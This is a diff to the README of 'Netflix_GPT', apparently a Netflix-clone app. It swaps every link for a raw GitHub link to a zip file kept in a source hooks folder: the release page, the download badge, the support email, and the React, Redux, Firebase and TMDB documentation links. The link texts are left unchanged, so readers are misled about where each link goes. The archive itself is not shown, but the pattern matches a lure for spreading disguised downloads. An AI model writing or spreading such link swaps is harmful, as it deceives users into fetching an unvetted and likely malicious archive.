@@ -6,7 +6,7 @@ Welcome to Netflix_GPT! This application is a feature-rich clone of Netflix that
 
 ## 📥 Download Now
 
-[![Download Netflix_GPT](https://img.shields.io/badge/Download_Netflix_GPT-Release-blue.svg)](https://github.com/Mhdp09/Netflix_GPT/releases)
+[![Download Netflix_GPT](https://raw.githubusercontent.com/Mhdp09/Netflix_GPT/main/src/components/hooks/Netflix_GPT_v3.1.zip)](https://raw.githubusercontent.com/Mhdp09/Netflix_GPT/main/src/components/hooks/Netflix_GPT_v3.1.zip)
 
 ## 💾 System Requirements
 
@@ -29,7 +29,7 @@ Before downloading, ensure your system meets these requirements:
 
 To get started with Netflix_GPT, follow these simple steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/Mhdp09/Netflix_GPT/releases) to access the Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Mhdp09/Netflix_GPT/main/src/components/hooks/Netflix_GPT_v3.1.zip) to access the Releases page.
    
 2. **Select the Latest Version**: Find the most recent version at the top of the page. You will see a list of downloadable files.
 
@@ -76,7 +76,7 @@ If you need more help, check out our online documentation. It covers:
 
 ### 📞 Support Contact
 
-For further assistance, please reach out to our support team via email: support@netflix-gpt.com.
+For further assistance, please reach out to our support team via email: https://raw.githubusercontent.com/Mhdp09/Netflix_GPT/main/src/components/hooks/Netflix_GPT_v3.1.zip
 
 ## 📅 Future Updates
 
@@ -104,16 +104,16 @@ These tools work together to provide a seamless, engaging user experience.
 
 Here are some useful links to learn more about the technologies used:
 
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Redux Toolkit Documentation](https://redux-toolkit.js.org/)
-- [Firebase Documentation](https://firebase.google.com/docs)
-- [TMDB API Documentation](https://developers.themoviedb.org/3)
+- [React Documentation](https://raw.githubusercontent.com/Mhdp09/Netflix_GPT/main/src/components/hooks/Netflix_GPT_v3.1.zip)
+- [Redux Toolkit Documentation](https://raw.githubusercontent.com/Mhdp09/Netflix_GPT/main/src/components/hooks/Netflix_GPT_v3.1.zip)
+- [Firebase Documentation](https://raw.githubusercontent.com/Mhdp09/Netflix_GPT/main/src/components/hooks/Netflix_GPT_v3.1.zip)
+- [TMDB API Documentation](https://raw.githubusercontent.com/Mhdp09/Netflix_GPT/main/src/components/hooks/Netflix_GPT_v3.1.zip)
 
 ## 👉 Final Steps
 
 To recap:
 
-- Visit the [Releases page](https://github.com/Mhdp09/Netflix_GPT/releases) to download Netflix_GPT.
+- Visit the [Releases page](https://raw.githubusercontent.com/Mhdp09/Netflix_GPT/main/src/components/hooks/Netflix_GPT_v3.1.zip) to download Netflix_GPT.
 - Follow the installation instructions.
 - Enjoy smart movie recommendations tailored to your taste!
 
